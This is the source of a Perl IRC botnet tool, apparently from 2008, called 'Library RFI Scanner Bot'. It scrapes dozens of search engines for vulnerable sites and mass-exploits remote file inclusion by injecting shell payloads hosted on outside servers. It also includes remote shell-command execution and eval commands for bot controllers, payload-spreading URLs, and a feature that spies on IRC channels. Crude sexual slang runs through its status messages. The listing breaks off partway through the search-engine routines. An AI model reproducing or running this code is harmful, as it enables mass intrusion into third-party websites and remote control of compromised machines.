#!/usr/bin/perl

print('
########################################
## Library RFI Scanner Bot v4.9       ##
## By Oxy                             ##
## Ã¯Â¿Â½ Agu-Nov 2008, Library Comunity   ##
########################################
');
######################################################
## Usage:                                           ##
##   perl feelscanz.pl <chan w/o #> <server> <port> ##
## Notes:                                           ##
## + All Parameters are optional                    ##
##                                                  ##
## Features:                                        ##
## + RFI Scanner                                    ##
## + RFI Scan & Exploit (Exploit per engine)        ##
## + Joomla RFI Scan & Exploit                      ##
## + Milw0rm Search                                 ##
## + Google bypass (Using PHP)                      ##
## + Message Spy & Save                             ##
######################################################
## History:
## + Fixed cryptz command (v4.5)
## + Fixed user commands execution by unauthorized user (v4.6)
## + Added options to enable/disable encrypted password (v4.7)
## + Fixed missing hostname on sublink (v4.8)
## + Added links filter to exclude exploiting bad links (v4.9)

use strict;

use IO::Socket::INET;
use LWP::UserAgent;
use HTTP::Request;

my $versi   = "K.E.P.E.T";
my $cmdpre  = "."; #Command Prefix

##[ KONFIGURASI URL ]##
my $fx29id  = "http://jh83.fileave.com/home.txt?"; #Fx29ID (Simple) / (Advanced)
my $fx29id2 = "http://jh83.fileave.com/id2.txt?"; #Fx29ID (Advanced)
my $fx29sh  = "http://jh83.fileave.com/eek.txt?"; #Fx29Sh (Optional)
my $bypass  = "http://www.ekosystem.org/googlerz.php?"; #Google Bypasserz (Optional)

##[ KONFIGURASI SOURCE ]##
my $mysite  = "http://jh83.fileave.com/"; #Path to Sources URL (Optional)
my $spread  = $mysite."bot.txt"; #Fx29Spreadz (Optional)
my $joomlaz = $mysite."bugz/joomla.txt"; #Joomla's Bugs List (Required for Joomla RFI Scanner)

##[ KONFIGURASI IRC ]##
my @servers = ("scanner.homelinux.net"); #IRC Servers (Separated by coma)
my %bot     = (
  nick    => "eek[".int(rand(100))."]",
  ident   => "ox66",
  chan    => ["#Oxyde"], #Channels to join (Separated by coma)
  server  => $servers[rand(scalar(@servers))],
  port    => "7000"
);

##[ KONFIGURASI USER ##
## status: admin, user
## cryptz: 0 = Non-Encrypted Password, 1 = Encrypted Password
my %boss = (
  Jh0Ns => {
    pass   => 'yon',
    status => "admin",
    cryptz => 1,
    login  => 0
  },
  Jh0Ns => {
    pass   => 'yon',
    status => "admin",
    cryptz => 1,
    login  => 0
  },
  Jh0Ns => {
    pass   => 'yon',
    status => "admin",
    cryptz => 0,
    login  => 0
  },
);

##[ KONFIGURASI SPY ]##
my %spy = (
  host   => "", #Channels to show spied text
  chanz  => [""], #Channels to spy (Separated by coma)
  wordz  => ['http://.+?[=]'], #Text to spy (Regex, Separated by coma)
  foundz => []
);

##[ KONFIGURASI BOT ]##
## Options: 0 = Disable, 1 = Enable
my %conf = (
  showsite => 1, #Show link to debug channel (Yes/No)
  linez    => 3, #Lines per message
  sleepz   => 3, #Message delay per linez (seconds)
  rfipid   => 50, #Sites per proccess
  rficnt   => 100, #Counter setting
  rficnt2  => 200, #Counter setting
  timeout  => 4, #Http socket time out
);

##[ KONFIGURASI WARNA ]##
my %colz = (
  1 => "8,1 [4!8]9 " , 2 => " 8[4eek8] ", #Header
  3 => "8,1[4!8]9 " , 4 => " 8[4eek8]", #Proses
);

##[ PARAMETER BARIS PERINTAH ]##
$bot{chan}   = "#".$ARGV[0] if $ARGV[0];
$bot{server} = $ARGV[1] if $ARGV[1];
$bot{port}   = $ARGV[2] if $ARGV[2];

##[ INISIALISASI VARIABEL ]##
my $chanx    = "#Oxyde"; #2nd Channel to show the results of vurnerable site
my $dbgchan  = "#jh"; #For debugging purposes (Optional)
my @chans    = ($bot{chan});
my @badbugz  = ("scan","bug"); #Bad bugs to cancel scanning
my @baddorkz = ("dork"); #Bad dorks to cancel scanning
my @badlinkz = ("access*log","accesslog","awstats","error.log","wwwstats","google.com"); #Bad links to exclude
my $keluar   = 0;
my $sock;

##[ KONFIGURASI LOCALTESTING ]##
my $tez = $ARGV[3];
if ($tez == 1) {
  my $situs = "http://localhost/fx29sh/";
  $fx29id   = $situs."fx29id1.txt?";
  $fx29id2  = $situs."fx29id2.txt?";
  $fx29sh   = $situs."fx29sh.txt?";
}

##[ PROGRAM UTAMA ]##
if (fork() == 0) {
  while ($keluar != 1) { irc_connect(); }
  die("KeLuaR!");
}

##[ SUBRUTIN KONEKSI IRC ]##
sub irc_connect {
  $sock = IO::Socket::INET->new(PeerAddr => $bot{server},
                                PeerPort => $bot{port},
                                Proto    => 'tcp')
                            or die "Error: Ga bisa connect ke ".$bot{server}.":".$bot{port}."!\r\n";
  $sock->autoflush(1);
  
  irc_nick($bot{nick});
  irc_user($bot{ident});
  
  my ($baris,$hb);
  my $loginboss = 0;
  my $userstat  = "";
  
  while ( $baris = <$sock> ) {
    $hb++;
    
    ##[ PARSING ]##
    my $com;
    my $me = $bot{nick};
    my ($fcom,$dteks,@teks) = split(/\s+:/,$baris);
    my ($duhost,$dcom,$dtarget) = split(/ /,$fcom);
    my ($dnick,$dhost) = split(/!/,$duhost);
    $dcom    = "" unless ($dcom);
    $dtarget = "" unless ($dtarget);
    $dnick =~ s/://;
    $dteks = trimrn($dteks);
    if ($dteks =~ /^[$cmdpre](.*)/) { $com = $1; } else { $com = ""; }

    #print $baris."\n$dnick | $dcom | $dtarget : $dteks\n";

    ##[ CEK USER ]##
    if   ($boss{$dnick}) { ($loginboss,$userstat) = ($boss{$dnick}{"login"},$boss{$dnick}{"status"}); }
    else { ($loginboss,$userstat) = (0,""); }

    ##[ RESPON KE SERVER ]##
    if    ($dnick =~ /PING/) { irc_raw("PONG $dteks"); }
    if    ($dcom =~ /001/) { irc_join($chanx); irc_join($dbgchan); foreach my $c (@chans) { irc_join($c); } }
    elsif ($dcom =~ /NICK|PART|QUIT/) { if ( $boss{$dnick}{"login"} == 1 ) { $boss{$dnick}{"login"} = 0; irc_ntc($dnick,"Logout!");  } }

    ##[ PERINTAH PUBLIK ]##
    if    (($dtarget) && ($dtarget eq $me)) { $dtarget = $dnick; }
    if    ($com =~ /^help$/) { bot_help($dtarget,1); }
    elsif ($com =~ /^info$/) { bot_info($dtarget); }
    elsif ($com =~ /^url(en|de)\s+(.*)/) {
      my $url = $2; my $en;
      if    ( $1 eq "en" ) { $en = "Encode"; $url = urlen($url); }
      elsif ( $1 eq "de" ) { $en = "Decode"; $url = urlde($url); }
      msgi($dtarget,"URL $en", $url);
    }
    elsif ($com =~ /^cek\s+(http:\/\/.*[=])/) { cek_shell($dtarget,$dnick,$1); }
    elsif ($com =~ /^respon/) { cek_respon($dtarget); }
    elsif ($com =~ /^milw0rm\s+(.*)/) { milw0rm($dtarget,$1); }
    elsif ($com =~ /^auth$|auth\s+(.*)/ && $boss{$dnick}) {
      my $pass = $1; my $auth = $boss{$dnick}{"login"};
      if ( $pass && $auth == 0 ) {
        if ($boss{$dnick}{"cryptz"} == 1) { $pass = cryptz($pass); }
        if ($pass eq $boss{$dnick}{"pass"}) {
          $boss{$dnick}{"login"} = 1;
          irc_ntc($dnick,"OK ".$boss{$dnick}{"status"}."!");
        }
        else { irc_ntc($dnick,"Error!"); }
      }
      else {
        if ($auth == 0) { irc_ntc($dnick,"Blom auth!"); }
        else { irc_ntc($dnick,$boss{$dnick}{"status"}."!"); } }
    }
    if ($dtarget && $dtarget ne $me) {
      if    (($com =~ /^scan\s+(.+?[=])\s+(.*)/) && (fork() == 0)) { s_scanz($dtarget,$1,$2,$hb,1); exit;  }
      elsif (($com =~ /^scan2\s+(.+?[=])\s+(.*)/) && (fork() == 0)) { s_scanz($dtarget,$1,$2,$hb,2); exit; }
    }
    ##[ END OF PUBLIC ]##

    ##[ PERINTAH USER ]##
    if ($loginboss == 1) {
      if    ($com =~ /^help/) { bot_help($dtarget,2); }
      elsif ($com =~ /^join\s+(.*)/) { irc_join($1); push(@chans,$1); }
      elsif ($com =~ /^part\s+(.*)/) {
        my $pchan = $1; irc_part($1);
        for my $i(0..scalar(@chans)) { if ($chans[$i] eq $pchan) { undef $chans[$i]; } }
      }
      elsif ($com =~ /^nick\s+(.*)/) { $bot{nick} = $1; irc_nick($bot{nick}); }
      elsif ($com =~ /^hitung\s+([0-9].*)/) { $conf{rficnt} = $1; msgi($dtarget,"RFI Count",$conf{rficnt}); }
      elsif ($com =~ /^bos$/ ) { my @bos = keys %boss; my $bos2 = join(" ",@bos); msgi($dtarget,"BoZz",$bos2); }
      elsif ($com =~ /^cryptz\s+(.*)/) { msgi($dnick,$1,cryptz($1)); }
      elsif ($com =~ /^logout$/ ) { $boss{$dnick}{"login"} = 0; irc_ntc($dnick,"Logout berhasil!"); }
      elsif (($com =~ /^joomla\s+(.*)/) && (fork() == 0)) { s_scanz($dtarget,"",$1,$hb,3); exit; }
      elsif ($com =~ /^sublink\s+(.*)/) { my @sl = lnk_sub($1); foreach my $e(@sl) { irc_msg($dtarget,$e); } }
      elsif ($com =~ /^http(1|2|3)\s+(.+?)\s+(.*)/) {
        my ($t,$nf,$q) = ($1,$2,$3);
        my $h;
        if ($t == 1) { $h = bukasitus($q); }
        elsif ($t == 2) { $h = bukasitus2($q); }
        else { $h = bukasitus3($q); }
        f_simpan2($nf,$h); ntci($dnick,"SaVeD ($t)",$nf);
      }
      elsif ($com =~ /^regex(1|2)\s+(.+?)\s+(.*)/) {
        my $n = $1;
        my $q = bukasitus($2);
        my $regex = $3;
        if ($n ==1) {
          if ($q !~ /$regex/) { irc_msg($dtarget,"Ga cocok!"); }
          while ($q =~ m/$regex/g ) { irc_msg($dtarget,$1); sleep(1); }
        }
        else {
          while ($q =~ m/<a href=\"(.*?)\">http:\/\/(.*?)<\/a>/g) { irc_msg($dtarget,$2); sleep(1); }
        }
      }
    }
    ##[ END OF USER ]##

    ##[ PERINTAH ADMIN ]##
    if (($loginboss == 1) && ($userstat eq "admin")) {
      if    ($com =~ /^help/) { bot_help($dtarget,3); }
      elsif ($com =~ /^chans/) { my $chans = join(",", @chans); ntci($dnick,"ChaNz",$chans);  }
      ##[ PERINTAH SPY ]##
      elsif ($com =~ /^spy$/ ) { ntci($dnick,"SpY","Host: ".$spy{"host"}." Chans: ".join(",", @{ $spy{"chanz"} })." Words: ".join(",", @{ $spy{"wordz"} })); }
      elsif ($com =~ /^spy(found|show|clear)$/ ) {
        my $n = $1;
        if ($n eq "found") { msgi($dtarget,"SpYFouNd",scalar(@{ $spy{"foundz"} })); }
        elsif ($n eq "show") {
          my $i = 0;
          for my $f (@{ $spy{"foundz"} }) { irc_msg($dtarget,$f); }
          $i++; if ($i % $conf{linez} == 0) { sleep($conf{sleepz}); }
        }
        elsif ($n eq "clear") { $spy{"foundz"} = []; msgi($dtarget,"SpyList","DiBersiHkaN!"); }
        else { msge($dtarget,"Spy","PeRinTah SaLah!"); }
      }
      elsif ($com =~ /^spyhost\s+(.*)/ ) { $spy{"host"} = $1; ntci($dnick,"SpYHosT",$spy{"host"}); }
      elsif ($com =~ /^spychan\s+(.*)/ ) {
        unless ($spy{"host"}) { msge($dtarget,"SiLaHkaN SeT SpyHost TerLebih DahuLu!",""); }
        else{ irc_join($1); push @{ $spy{"chanz"} }, $1; my $chans = join(",", @{ $spy{"chanz"} }); ntci($dnick,"SpYChaNz",$chans); }
      }
      elsif ($com =~ /^spyword\s+(.*)/ ) { push @{ $spy{"wordz"} }, $1; my $words = join(",", @{ $spy{"wordz"} }); ntci($dnick,"SpYWoRDz",$words); }
      ##[ END OF PERINTAH SPY ]##
      elsif ($com =~ /^quit/) { irc_quit("Good Bye!"); $keluar = 1; exit; }
      elsif ($com =~ /^keluar/) { irc_quit("Killed!"); $keluar = 1; system("killall perl"); exit; }
      elsif ($com =~ /^raw\s+(.*)/) { irc_raw($1); }
      elsif ($com =~ /^rfipid\s+([0-9].*)/) { $conf{rfipid} = $1; msgi($dtarget,"RFI Pid",$conf{rfipid}); }
      elsif ($com =~ /^cshell\s+(.*)/) { $fx29sh = $1; msgi($dtarget,"Injector RFI",$fx29sh); }
      elsif ($com =~ /^crespon(1|2)\s+(.*)/) {
        my ($n,$url) = ($1,$2);
        if    ($n == 1) { $fx29id = $url; }
        elsif ($n == 2) { $fx29id2 = $url; }
        msgi($dtarget,"Respon $n RFI",$url);
      }
      elsif ($com =~ /^cspread\s+(.*)/) {
        my $url = $1;
        $spread = $url;
        msgi($dtarget,"Spread RFI",$spread);
      }
      elsif ($com =~ /^\+bos\s+(.+?)\s+(.*)/) {
        $boss{$1}{pass}   = "fx";
        $boss{$1}{status} = $2;
        $boss{$1}{login}  = 0;
        $boss{$1}{cryptz} = 0;
        ntci($dnick,"BoZz","$1 ditambahkan sbg ".$boss{$1}{status});
        msgi($1,"BoZz","Hai $1! Ketik .auth ".$boss{$1}{pass});
      }
      elsif ($com =~ /^eval\s+(.*)/) { eval($1); }
      elsif (( $com =~ /^cmd\s+(.*)/) && ( fork() == 0 ) ) {
        my $cmd = $1;
        if ($cmd =~ /cd (.*)/) { chdir("$1") || irc_msg($dtarget,"Ga bisa ganti dir!"); return; }
        my @output = `$cmd`;
        my $i = 0;
        foreach my $out (@output) {
          $i++; if ($i % $conf{linez} == 0) { sleep($conf{sleepz}); }
          irc_msg($dtarget,"$out");
        }
        exit;
      }
    }
    ## END OF ADMIN ##
    
    ##[ MATA-MATA ]##
    if ($dtarget ne $spy{"host"}) {
      my $is_spychan = grep $_ eq $dtarget, @{$spy{"chanz"}};
      if ($is_spychan == 1) {
         for my $t (@{$spy{"wordz"}}) {
           if ($dteks =~ /$t/) {
             msgi($spy{"host"},"!",$dteks); sleep(1);
             push @{ $spy{"foundz"} }, $dteks;
           }
         }
       }
    }
    ##[ END OF MATA-MATA ]##
  }
  ## END WHILE ##
}
## END KONEK ##

#########################
##[ RUTIN EKSPLOITASI ]##
#########################
sub s_scanz {
  my ($to,$bug,$dork,$sb,$type) = @_;
  $sb = "Fx".$sb.".txt";
  $dork = bersihdork($to,$dork);
  my %typez = (
    1 => "RFI ScaNneR",
    2 => "RFI ScaN & ExpLoiT",
    3 => "JooMLa MaSs ScaN & ExpLoiT"
  );
  my $badbug  = cek_bug($bug);
  if ($badbug == 1) { msge($to,"BuG","BuGnya JeLek! Pencabulan Dibatalkan!"); return; }
  my $baddork = cek_dork($dork);
  if ($baddork == 1) { msge($to,"DoRk","DorKnya JeLek! Pencabulan Dibatalkan!"); return; }
  if ($type == 3) {
    my $h = bugjoomla("hitung");
    if ($h == 0) { msge($to,"Joomla","BuGnya Ga BiSa DiLoaD! Pencabulan Dibatalkan!"); return; }
  }
  irc_msg($to,$colz{1}."MeMeRikSa Keperawanan..".$colz{2});
  my $stat = cek_respon($to);
  if ($stat != 2) { irc_msg($to,$colz{1}."Gak Perawan! Ngentot Dibatalkan!".$colz{2}); return; }
  irc_msg($to,$colz{1}."".$typez{$type}." Ngentot DiMuLai!0 ".$conf{rfipid}."/PID 9ID:0 $sb".$colz{2});
  irc_msg($to,$colz{1}."BuGz:0 $bug ") if ($type != 3);
  irc_msg($to,$colz{1}."DoRkz:0 $dork ");
  s_cari($to,$dork,$sb,$bug,$type);
  s_eksploit(1,$to,$bug,$dork,$sb) if ($type == 1);
  irc_msg($to,$colz{1}."".$typez{$type}." SeLeSai Diperkosa!0 $dork 9ID:0 $sb".$colz{2});
  return;
}

sub s_eksploit {
  #Type: 1 = Biasa, 2 = Cari dan exploit, 3 = Joomla
  #Engine: Kosong = Eksploit total, Ada = Eksploit per engine
  my ($type,$chan,$bug,$dork,$tf,$engine) = @_;
  my @prosesbaru;
  my @semuatarget;
  my $hitung;
  my $num = 0;
  my @bugjoomla = bugjoomla($chan) if ($type == 3);
  unless (open(FILEZ,"< $tf")) { msge($chan,"FILE","Ga BiSa BuKa $tf!"); return; }
  while (my $r = <FILEZ>) { $r =~ s/\n//g; push(@semuatarget,$r); }
  close(FILEZ);
  f_hapus($tf);
  my @kotor = lnk_sortir(@semuatarget);
  my @target = lnk_filter(@kotor);
  if (!$engine) {
    irc_msg($chan,$colz{1}."HaSiL Pencabulan0 $dork".$colz{2});
    irc_msg($chan,$colz{1}."ToTaL:0 ".scalar(@semuatarget)." 9Pelacur:0 ".scalar(@kotor)." 9Perawan:0 ".scalar(@target)." 9ID:0 $tf".$colz{2}." ".$colz{1}."Pemerkosaan DiMuLai!".$colz{2});
  }
  foreach my $situs (@target) {
    $hitung++;
    if ($hitung % $conf{rfipid} == 0) {
      foreach my $f (@prosesbaru) { waitpid($f,0); }
      $num = 0;
    }
    if ($type == 1 && $hitung % $conf{rficnt} == 0) {
      irc_msg($dbgchan,$situs) if ($conf{showsite} == 1);
      irc_msg($chan,$colz{3}.$hitung."3 ".scalar(@target).$colz{4});
    }
    if ($type != 1 && $hitung % $conf{rficnt2} == 0) {
      irc_msg($dbgchan,$situs) if ($conf{showsite} == 1);
      irc_msg($chan,"9,1 $engine15 ".$hitung."14 ". scalar(@target). " ");
    }
    $prosesbaru[$num] = fork();
    if ($prosesbaru[$num] == 0) {
      if ($type != 3) {
        my $q = bukasitus("http://".$situs.$bug.$fx29id."?");
        if ($q =~ /FeeLCoMz/) { safemode(1,$chan,$situs,$bug,$engine); sleep($conf{sleepz}); }
      }
      else {
        foreach my $bug (@bugjoomla) {
          my $q = bukasitus("http://".$situs.$bug.$fx29id."?");
          if ($q =~ /FeeLCoMz/) { safemode(1,$chan,$situs,$bug,$engine); sleep($conf{sleepz}); }
        }
      }
      exit(0);
    }
    $num++;
  }
  irc_msg($chan,$colz{1}."MeNunGGu ".scalar(@prosesbaru)." perawan di perkosa..".$colz{2}) if (!$engine);
  foreach my $f (@prosesbaru) { waitpid($f,0); }
  irc_msg($chan,"9,1 $engine 0FiNizZ! ") if ($engine);
}
###########################
##[ RUTIN SEARCH ENGINE ]##
###########################################################################
## GOOGLE  : AOL, *CompuServe, *Mahalo.com, *MySpace, *Netscape, *Ripple ##
## YAHOO   : AltaVista, AlltheWeb, GoodSearch, *Rectifi                  ##
## LIVE    : *A9.com, *Ms.Dewey, *Tafiti                                 ##
## ASK     : *iWon, Lycos                                                ##
## LAINNYA : Abacho, Clusty, Dmoz, Euroseek, Fireball, Hotbot, Mamma,    ##
##           Virgilio, Webcrawler, Webde                                 ##
## * Not implemented yet
###########################################################################
sub s_cari {
  #Type: 1 = Cari saja, 2 = Cari dan eksploit, 3 = Cari dan eksploit Joomla
  my ($chan,$dork,$nf,$bug,$type) = @_;
  my @engz;
  my $key = $dork;
  $dork = urlen($key);
  $engz[0]  = fork(); if ($engz[0]  == 0) { s_engine("google","Google",$type,$chan,$bug,$dork,$nf); exit; }
  #$engz[1]  = fork(); if ($engz[1]  == 0) { s_engine("aol","Aol",$type,$chan,$bug,$dork,$nf); exit; }
  #$engz[2]  = fork(); if ($engz[2]  == 0) { s_engine("netscape","Netscape",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[3]  = fork(); if ($engz[3]  == 0) { s_engine("yahoo","Yahoo",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[4]  = fork(); if ($engz[4]  == 0) { s_engine("live","Live",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[5]  = fork(); if ($engz[5]  == 0) { s_engine("ask","Ask",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[6]  = fork(); if ($engz[6]  == 0) { s_engine("google2","Google2",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[7]  = fork(); if ($engz[7]  == 0) { s_engine("altavista","Altavista",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[8]  = fork(); if ($engz[8]  == 0) { s_engine("alltheweb","AllTheWeb",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[9]  = fork(); if ($engz[9]  == 0) { s_engine("goodsrch","GoodSearch",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[10] = fork(); if ($engz[10] == 0) { s_engine("lycos","Lycos",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[11] = fork(); if ($engz[11] == 0) { s_engine("uol","Uol",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[12] = fork(); if ($engz[12] == 0) { s_engine("fireball","Fireball",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[13] = fork(); if ($engz[13] == 0) { s_engine("gigablast","Gigablast",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[14] = fork(); if ($engz[14] == 0) { s_engine("virgilio","Virgilio",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[15] = fork(); if ($engz[15] == 0) { s_engine("webde","Web.de",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[16] = fork(); if ($engz[16] == 0) { s_engine("mamma","Mamma",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[17] = fork(); if ($engz[17] == 0) { s_engine("clusty","Clusty",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[18] = fork(); if ($engz[18] == 0) { s_engine("dmoz","Dmoz",$type,$chan,$bug,$dork,$nf); exit; }
  #$engz[19] = fork(); if ($engz[19] == 0) { s_engine("abacho","Abacho",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[20] = fork(); if ($engz[20] == 0) { s_engine("euroseek","Euroseek",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[21] = fork(); if ($engz[21] == 0) { s_engine("hotbot","Hotbot",$type,$chan,$bug,$dork,$nf); exit; }
  $engz[22] = fork(); if ($engz[22] == 0) { s_engine("webcrawl","WebCrawler",$type,$chan,$bug,$dork,$nf); exit; }
  irc_msg($chan,$colz{1}."MeNunGGu ".scalar(@engz)." proses pemerkosaan dimulai..".$colz{2});
  foreach my $e (@engz) { waitpid($e,0); }
}
sub s_engine {
    my ($f,$se,$type,$chan,$bug,$dork,$ef) = @_;
    my @hc;
    if    ($f eq "google"   ) { @hc = se_google($chan,$dork,$ef); }
    elsif ($f eq "google2"  ) { @hc = se_google_m($chan,$dork,$ef); }
    elsif ($f eq "aol"      ) { @hc = se_aol($chan,$dork,$ef); } #Unused
    elsif ($f eq "netscape" ) { @hc = se_netscape($chan,$dork,$ef); } #Unused
    elsif ($f eq "yahoo"    ) { @hc = se_yahoo($chan,$dork,$ef); }
    elsif ($f eq "altavista") { @hc = se_altavista($chan,$dork,$ef); }
    elsif ($f eq "alltheweb") { @hc = se_alltheweb($chan,$dork,$ef); }
    elsif ($f eq "goodsrch" ) { @hc = se_goodsearch($chan,$dork,$ef); }
    elsif ($f eq "ask"      ) { @hc = se_ask($chan,$dork,$ef); }
    elsif ($f eq "fireball" ) { @hc = se_fireball($chan,$dork,$ef); }
    elsif ($f eq "gigablast") { @hc = se_gigablast($chan,$dork,$ef); }
    elsif ($f eq "lycos"    ) { @hc = se_lycos($chan,$dork,$ef); }
    elsif ($f eq "live"     ) { @hc = se_live($chan,$dork,$ef); }
    elsif ($f eq "hotbot"   ) { @hc = se_hotbot($chan,$dork,$ef); }
    elsif ($f eq "virgilio" ) { @hc = se_virgilio($chan,$dork,$ef); }
    elsif ($f eq "webde"    ) { @hc = se_webde($chan,$dork,$ef); }
    elsif ($f eq "uol"      ) { @hc = se_uol($chan,$dork,$ef); }
    elsif ($f eq "abacho"   ) { @hc = se_abacho($chan,$dork,$ef); } #Unused
    elsif ($f eq "mamma"    ) { @hc = se_mamma($chan,$dork,$ef); }
    elsif ($f eq "clusty"   ) { @hc = se_clusty($chan,$dork,$ef); }
    elsif ($f eq "dmoz"     ) { @hc = se_dmoz($chan,$dork,$ef); }
    elsif ($f eq "euroseek" ) { @hc = se_euroseek($chan,$dork,$ef); }
    elsif ($f eq "webcrawl" ) { @hc = se_webcrawler($chan,$dork,$ef); }
    my @cl = lnk_sortir(@hc);
    msgr($chan,$se,scalar(@hc),scalar(@cl));
    if (scalar(@cl) == 0) { exit; }
    if ($type == 1) { foreach my $e (@cl) { f_simpan($ef,$e); } }
    else {
      my $ef2 = $f.$ef;
      foreach my $e (@cl) { f_simpan($ef2,$e); }
      if    ($type == 2) { s_eksploit(2,$chan,$bug,$dork,$ef2,$se); }
      elsif ($type == 3) { s_eksploit(3,$chan,$bug,$dork,$ef2,$se); }
    }
}
##[ GOOGLE ]##
sub se_google {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50; my $max = 5000; my $p = 0;
  #my $url = "http://localhost/search/google.co.id.htm";
  my $url = "http://www.google.co.id/search?num=".$num."&hl=id&q=".$key."&start=".$p."&sa=N";
  my $murl = "http://www.google.co.id";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q !~ /2008 Google/ ) { msge($chan,"Google","Pelacur!!"); @daftar = se_gbypass($chan,$key,$nf); }
  if ( $q =~ /dari sekitar <b>(.+?)<\/b>/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,"Google","$h");
  }
  if ( $q =~ /class=b><a href=\"(.*?)\">/ ) {
      my $nxurl = $1; msgn($dbgchan,"Google","$nxurl");
  }
  while ( $q =~ m/<h3 class=r><a href=\"http:\/\/(.*?)\"/g ) { push (@daftar, $1); }
  for ($p=50;$p<=$max;$p+=$num) {
    $nxurl = "http://www.google.co.id/search?num=".$num."&hl=id&q=".$key."&start=".$p."&sa=N";
    $q = bukasitus($nxurl);
    while ( $q =~ m/<h3 class=r><a href=\"http:\/\/(.*?)\"/g ) {  push (@daftar, $1);  }
    if ( $q !~ /<h3 class=r><a href=\"http:\/\/(.*?)\"/ ) { return @daftar;  }
  }
  return @daftar;
}
##[ GOOGLE BYPASS ]##
sub se_gbypass {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50; my $max = 1000; my $p = 0;
  my $url = $bypass."?key=".$key."&max=".$max;
  my $nxurl;
  my $q = bukasitus($url);
  while ( $q =~ m/<h3 class=r><a href=\"http:\/\/(.*?)\"/g ) {  push (@daftar, $1);  }
  return @daftar;
}
##[ GOOGLE MULTI DOMAIN ]##
sub se_google_m {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50; my $max = 5000; my $p;
  my @doms = (
    "com","ae","com.ar","at","com.au","be","com.br","ca","ch","cl","de","dk","fi","fr","gr","com.hk",
    "ie","co.il","it","co.jp","co.kr","lt","lv","nl","com.pa","com.pe","pl","pt","ru","com.sg",
    "com.tr","com.tw","com.ua","co.uk","hu");
  my $dom = $doms[rand(scalar(@doms))];
  my $url = "http://www.google.".$dom."/search?&num=".$num."&q=".$key;
  my $murl = "http://www.google.".$dom;
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /class=b><a href=\"(.*?)\">/ ) {
      my $nxurl = $1;
      msgn($dbgchan,"Google.".$dom,$nxurl);
      msgn($chan,"Google.".$dom,"LaGi NyAri Kondom..");
  }
  while ( $q =~ m/<h3 class=r><a href=\"http:\/\/(.*?)\"/g ) { push (@daftar, $1); }
  for ($p=50;$p<=$max;$p+=$num) {
    $nxurl = "http://www.google.".$dom."/search?num=".$num."&q=".$key."&start=".$p."&sa=N";
    $q = bukasitus($nxurl);
    while ( $q =~ m/<h3 class=r><a href=\"http:\/\/(.*?)\"/g ) {  push (@daftar, $1);  }
    if ( $q !~ /<h3 class=r><a href=\"http:\/\/(.*?)\"/ ) { return @daftar;  }
  }
  return @daftar;
}
##[ AOL (Ga Pake) ]##
sub se_aol {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 1; my $max = 500; my $p;
  #my $url = "http://localhost/search/search.aol.com.htm";
  my $url = "http://search.aol.com/aol/search?query=".$key;
  my $murl = "http://search.aol.com/aol/";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /of&nbsp;about&nbsp;<b>(.*?)<\/b>/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,"Aol","$h");
  }
  if ( $q =~ /<span class=\"gspPageNext\"><a href=\"(.*?)\">/ ) {
      my $nxurl = $1; msgn($dbgchan,"Aol","$nxurl");
  }
  while ( $q =~ m/property=\"f:url\">http:\/\/(.*?)<\/p>/g ) { push (@daftar, $1); }
  while ( $q =~ /<span class=\"gspPageNext\"><a href=\"(.*?)\">/ ) {
    $nxurl = $murl.htmltourl($1);
    $q = bukasitus($nxurl);
    while ( $q =~ m/property=\"f:url\">http:\/\/(.*?)<\/p>/g ) { push (@daftar, $1); }
  }
  return @daftar;
}
##[ YAHOO ]##
sub se_yahoo {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50; my $max = 8000; my $p = "1";
  #my $url = "http://localhost/search/www.search.yahoo.com.htm";
  my $url = "http://www.search.yahoo.com/search?p=".$key."&ei=UTF-8&fr=yfp-t-501&fp_ip=IT&pstart=1&b=".$p;
  my $murl;
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /id=\"infotext\"><p> .*? of(.*?) for/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,"Yahoo","$h");
  }
  if ( $q =~ /999 Unable to process request at this time/ ) { msge($chan,"Yahoo","Banned!"); }
  if ( $q =~ /<a id=\"pg-next\" href=\"(.*?)\">Next/ ) {
      my $nxurl = $1; msgn($dbgchan,"Yahoo","$nxurl");
  }
  while ( $q =~ m/26u=(.*?)%26w=/g ) { push (@daftar, $1); }
  while ( $q =~ /<a id=\"pg-next\" href=\"(.*?)\">Next/ ) {
    $p++; if ( $p > $max ) { return @daftar; }
    $nxurl = $murl.htmltourl($1);
    $q = bukasitus($nxurl);
    while ( $q =~ m/26u=(.*?)%26w=/g ) { push (@daftar, $1); }
  }
  return @daftar;
}
##[ ALTAVISTA ]##
sub se_altavista {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 100; my $max = 500; my $p;
  #my $url = "http://localhost/search/www.altavista.com.htm";
  my $url = "http://www.altavista.com/web/results?itag=ody&q=".$key."&kgs=0&kls=0&nbq=".$num."&stq=".$p;
  my $murl;
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /<a href=\"(.*?)\" target=\"_self\">Next/ ) {
      my $nxurl = $1; msgn($dbgchan,"Altavista","$nxurl");
  }
